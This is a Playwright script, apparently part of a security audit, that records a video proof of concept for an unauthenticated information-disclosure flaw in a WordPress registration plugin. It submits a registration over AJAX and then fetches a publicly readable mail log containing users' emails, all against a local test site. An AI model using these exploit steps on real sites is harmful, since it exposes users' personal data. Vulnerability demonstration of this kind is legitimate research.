// PoC Video — Finding #1: User Registration <= 5.2.8 — Info Disclosure ur_mail_logs (Unauth)
// Génère poc-1-ur-mail-logs.mp4 (1920x1080, ~40s) — étapes: titre → inscription publique → lecture du log public par un visiteur → contrôle négatif
// Prérequis: env de test (scripts/setup-dynamic-env.sh), npm install playwright
// Run: node video-1-ur-mail-logs.js
const { chromium } = require('playwright');

(async () => {
  const browser = await chromium.launch({args:['--no-sandbox']});
  const context = await browser.newContext({ viewport: { width: 1920, height: 1080 }, recordVideo: { dir: './videos/', size: { width: 1920, height: 1080 } } });
  const page = await context.newPage();

  // Titre
  await page.setContent(`<html><body style="background:#1a1a2e;color:#fff;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh">
    <div style="text-align:center">
    <h1 style="color:#e94560">User Registration & Membership <= 5.2.8</h1>
    <h2>CWE-538 — Information Disclosure (ur_mail_logs) — Unauthenticated</h2>
    <p>Emails of registered users exposed in publicly-accessible log</p>
    </div></body></html>`);
  await page.waitForTimeout(7000);

  // Avant: inscription publique
  await page.goto('http://127.0.0.1/', { waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(3000);
  await page.evaluate(() => { const b = document.createElement('div'); b.style.cssText = 'position:fixed;top:10px;left:10px;background:#e94560;color:#fff;padding:8px 16px;z-index:9999;font-family:monospace'; b.textContent = 'BEFORE: visitor registers an account (no authentication needed)'; document.body.appendChild(b); });
  await page.waitForTimeout(2500);

  // Inscription via AJAX (déclenche l'email → log)
  await page.evaluate(async () => {
    const data = new URLSearchParams({
      action: 'user_registration_user_form_submit', form_id: '19', ur_frontend_form_nonce: 'x',
      form_data: JSON.stringify([
        {field_name:'user_login', value:'videovictim1'},
        {field_name:'user_email', value:'videovictim1@audit.local'},
        {field_name:'user_pass', value:'VideoPass12345!'},
        {field_name:'user_confirm_password', value:'VideoPass12345!'},
      ]),
    });
    const r = await fetch('/wp-admin/admin-ajax.php', { method: 'POST', body: data });
    const j = await r.json();
    const b = document.createElement('div'); b.style.cssText='position:fixed;bottom:60px;left:10px;background:#000;color:#0f0;padding:10px;z-index:9999;font-family:monospace;white-space:pre-wrap;max-width:90%';
    b.textContent = 'Registration AJAX response: ' + JSON.stringify(j); document.body.appendChild(b);
  });
  await page.waitForTimeout(6000);

  // Attaque: lecture du log public (visiteur non connecté)
  await page.goto('http://127.0.0.1/wp-content/uploads/ur-logs/ur_mail_logs-945cf207aa69efc77b875c0b0127bad6.log', { waitUntil: 'domcontentloaded' });
  await page.evaluate(() => { const b = document.createElement('div'); b.style.cssText='position:fixed;top:10px;left:10px;background:#000;color:#e94560;padding:10px;z-index:9999;font-family:monospace;white-space:pre-wrap;max-width:95%'; b.textContent = 'EXPOSED: the log contains user emails + subjects in plaintext (HTTP 200, unauthenticated)'; document.body.appendChild(b); });
  await page.waitForTimeout(6000);

  // Contrôle négatif: mauvais hash → 404
  await page.goto('http://127.0.0.1/wp-content/uploads/ur-logs/ur_mail_logs-ffffffffffffffffffffffffffffffff.log', { waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(4000);

  await context.close();
  await browser.close();
})();
